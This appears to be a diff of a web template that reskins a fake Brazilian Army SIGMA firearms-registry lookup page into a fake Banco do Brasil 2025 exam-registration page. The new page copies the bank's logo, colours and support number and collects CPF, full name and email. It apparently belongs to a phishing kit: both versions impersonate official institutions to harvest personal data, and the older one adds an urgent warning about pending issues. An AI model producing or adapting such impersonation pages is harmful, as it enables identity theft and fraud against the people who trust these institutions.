@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SIGMA - Sistema de Gerenciamento Militar de Armas</title>
+    <title>Banco do Brasil - Inscrição Concurso 2025</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -32,8 +32,8 @@
             theme: {
                 extend: {
                     colors: {
-                        'custom-blue': '#225BAC',
-                        'custom-yellow': '#F7CD04',
+                        'bb-yellow': '#FEEF37',
+                        'bb-blue': '#003DA5',
                     }
                 }
             }
@@ -41,46 +41,35 @@
     </script>
 </head>
 <body class="bg-gray-50 min-h-screen flex flex-col">
-    <div class="bg-white py-4">
+    <div class="bg-bb-yellow py-4">
         <div class="container mx-auto px-4">
             <div class="flex flex-col items-center text-center">
-                <img src="https://i.ibb.co/7RG7SfZ/MEAssinatura-1.png" alt="Logo of Secretaria de Estado de Economia" class="h-8 mb-2" />
+                <img src="https://www.bb.com.br/docs/pub/inst/img/LogoBB.svg" alt="Logo do Banco do Brasil" class="h-12 mb-2" />
                 <div>
-                    <p class="text-black text-[10px] leading-tight">
-                        EXÉRCITO BRASILEIRO
+                    <p class="text-bb-blue text-[16px] leading-tight font-bold">
+                        CONCURSO PÚBLICO 2025
                     </p>
-                    <p class="text-black text-[10px] leading-tight font-bold">
-                        COMANDO LOGÍSTICO - COLOG
-                    </p>
-                    <p class="text-black text-[10px] leading-tight">
-                        DIRETORIA DE FISCALIZAÇÃO DE PRODUTOS CONTROLADOS
+                    <p class="text-bb-blue text-[14px] leading-tight">
+                        Seleção Externa para Carreira Administrativa
                     </p>
                 </div>
             </div>
         </div>
     </div>
 
-    <div class="bg-custom-blue py-3 shadow-md">
+    <div class="bg-bb-blue py-3 shadow-md">
         <div class="container mx-auto px-4 flex items-center">
-            <button class="text-white text-2xl mr-4">
-                <div class="grid grid-cols-2 gap-0.5 drop-shadow-sm">
-                    <div class="w-2 h-2 bg-white"></div>
-                    <div class="w-2 h-2 bg-white"></div>
-                    <div class="w-2 h-2 bg-white"></div>
-                    <div class="w-1.5 h-1.5 bg-white"></div>
-                </div>
-            </button>
-            <span class="text-white text-xl drop-shadow-sm">SIGMA - CONSULTA DE CADASTRO</span>
+            <span class="text-white text-xl drop-shadow-sm">Sistema de Inscrição</span>
         </div>
     </div>
 
     <div class="container mx-auto px-4 py-4">
-        <div class="bg-custom-yellow bg-opacity-20 rounded-lg p-4 mb-6">
+        <div class="bg-yellow-100 rounded-lg p-4 mb-6">
             <div class="flex items-start">
-                <i class="fas fa-exclamation-triangle text-custom-yellow text-xl mr-3"></i>
+                <i class="fas fa-info-circle text-bb-blue text-xl mr-3"></i>
                 <div>
-                    <p class="font-bold mb-1">AVISO IMPORTANTE</p>
-                    <p class="text-sm">Prezado(a) Candidato(a) ao Certificado de Registro (CAC), informamos que para a conclusão do processo de cadastramento é imprescindível o acesso ao portal e a regularização de eventuais pendências identificadas. A não regularização das pendências impossibilitará a emissão do certificado, conforme previsto na legislação vigente.</p>
+                    <p class="font-bold mb-1">INFORMAÇÕES IMPORTANTES</p>
+                    <p class="text-sm">Prezado(a) Candidato(a), bem-vindo(a) ao sistema de inscrição do Concurso Público do Banco do Brasil 2025. Para prosseguir com sua inscrição, tenha em mãos seus documentos pessoais e siga as instruções apresentadas neste formulário.</p>
                 </div>
             </div>
         </div>
@@ -88,8 +77,8 @@
 
     <div class="container mx-auto px-4 pb-8 flex-grow">
         <div class="bg-white rounded shadow p-6">
-            <form id="consultaForm" method="POST" action="{{ url_for('consultar_cpf') }}">
-                <p class="mb-4">Informe seu CPF para consulta:</p>
+            <form id="inscricaoForm" method="POST" action="{{ url_for('consultar_cpf') }}">
+                <p class="mb-4 font-bold">Dados para Inscrição:</p>
                 <div class="relative mb-4">
                     <label class="block text-gray-700 text-sm font-bold mb-2" for="cpf">CPF:</label>
                     <div class="relative">
@@ -106,9 +95,25 @@
                         </div>
                     </div>
                 </div>
-                <button type="submit" id="submitBtn" class="bg-custom-blue hover:bg-opacity-90 text-white font-bold py-2 px-4 rounded w-full flex items-center justify-center space-x-2">
-                    <span>Consultar</span>
-                    <i class="fas fa-search ml-2"></i>
+                <div class="relative mb-4">
+                    <label class="block text-gray-700 text-sm font-bold mb-2" for="nome">Nome Completo:</label>
+                    <input class="appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
+                           id="nome"
+                           name="nome"
+                           type="text"
+                           required />
+                </div>
+                <div class="relative mb-4">
+                    <label class="block text-gray-700 text-sm font-bold mb-2" for="email">E-mail:</label>
+                    <input class="appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
+                           id="email"
+                           name="email"
+                           type="email"
+                           required />
+                </div>
+                <button type="submit" id="submitBtn" class="bg-bb-blue hover:bg-opacity-90 text-white font-bold py-2 px-4 rounded w-full flex items-center justify-center space-x-2">
+                    <span>Prosseguir com a Inscrição</span>
+                    <i class="fas fa-arrow-right ml-2"></i>
                 </button>
             </form>
             {% with messages = get_flashed_messages() %}
@@ -123,13 +128,13 @@
         </div>
     </div>
 
-    <div class="bg-custom-blue text-white text-center py-3 mt-auto">
-        <p class="text-sm">© {{ current_year }} Exército Brasileiro - DFPC. Todos os direitos reservados.</p>
-        <p class="text-sm">SIGMA - Sistema de Gerenciamento Militar de Armas</p>
+    <div class="bg-bb-yellow text-bb-blue text-center py-3 mt-auto">
+        <p class="text-sm">© {{ current_year }} Banco do Brasil S.A. Todos os direitos reservados.</p>
+        <p class="text-sm">Central de Atendimento BB - 0800 729 0722</p>
     </div>
 
     <script>
-        document.getElementById('consultaForm').addEventListener('submit', function(e) {
+        document.getElementById('inscricaoForm').addEventListener('submit', function(e) {
             const submitBtn = document.getElementById('submitBtn');
             const btnText = submitBtn.querySelector('span');
             const btnIcon = submitBtn.querySelector('i');
@@ -141,8 +146,8 @@
             // Change button appearance
             submitBtn.classList.add('bg-opacity-75');
             submitBtn.disabled = true;
-            btnText.textContent = 'Consultando...';
-            btnIcon.classList.remove('fa-search');
+            btnText.textContent = 'Processando...';
+            btnIcon.classList.remove('fa-arrow-right');
             btnIcon.classList.add('fa-circle-notch', 'animate-spin');
 
             // Adiciona timeout para restaurar o botão em caso de erro
@@ -150,51 +155,38 @@
                 if (submitBtn.disabled) {
                     submitBtn.classList.remove('bg-opacity-75');
                     submitBtn.disabled = false;
-                    btnText.textContent = 'Consultar';
+                    btnText.textContent = 'Prosseguir com a Inscrição';
                     btnIcon.classList.remove('fa-circle-notch', 'animate-spin');
-                    btnIcon.classList.add('fa-search');
+                    btnIcon.classList.add('fa-arrow-right');
                 }
-            }, 10000); // 10 segundos
+            }, 10000);
         });
 
         // Máscara para CPF
         const cpfInput = document.getElementById('cpf');
         cpfInput.addEventListener('input', function(e) {
             let value = e.target.value;
-
-            // Remove tudo que não é número
             value = value.replace(/\D/g, '');
-
-            // Limita a 11 dígitos
             if (value.length > 11) {
                 value = value.slice(0, 11);
             }
-
-            // Aplica a máscara
             if (value.length > 0) {
-                // Primeiro bloco (xxx)
                 if (value.length <= 3) {
                     value = value;
                 }
-                // Segundo bloco (xxx.xxx)
                 else if (value.length <= 6) {
                     value = value.slice(0, 3) + '.' + value.slice(3);
                 }
-                // Terceiro bloco (xxx.xxx.xxx)
                 else if (value.length <= 9) {
                     value = value.slice(0, 3) + '.' + value.slice(3, 6) + '.' + value.slice(6);
                 }
-                // Completo (xxx.xxx.xxx-xx)
                 else {
                     value = value.slice(0, 3) + '.' + value.slice(3, 6) + '.' + value.slice(6, 9) + '-' + value.slice(9);
                 }
             }
-
-            // Atualiza o valor do input
             e.target.value = value;
         });
 
-        // Adiciona listener para o backspace
         cpfInput.addEventListener('keydown', function(e) {
             if (e.key === 'Backspace' || e.key === 'Delete') {
                 let value = this.value.replace(/\D/g, '');
